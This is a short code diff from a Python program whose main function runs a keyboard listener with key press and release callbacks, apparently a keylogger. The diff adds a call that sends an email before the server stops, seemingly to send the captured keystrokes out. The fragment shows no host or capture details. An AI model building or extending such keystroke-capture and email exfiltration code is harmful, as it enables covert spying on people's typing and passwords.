@@ -12,6 +12,7 @@ def main():
     with Listener(on_press = logger.on_press, on_release = logger.on_release) as listener:
         listener.join()
 
+    myServer.send_email()
     myServer.kill()
     serverThread.join()
 
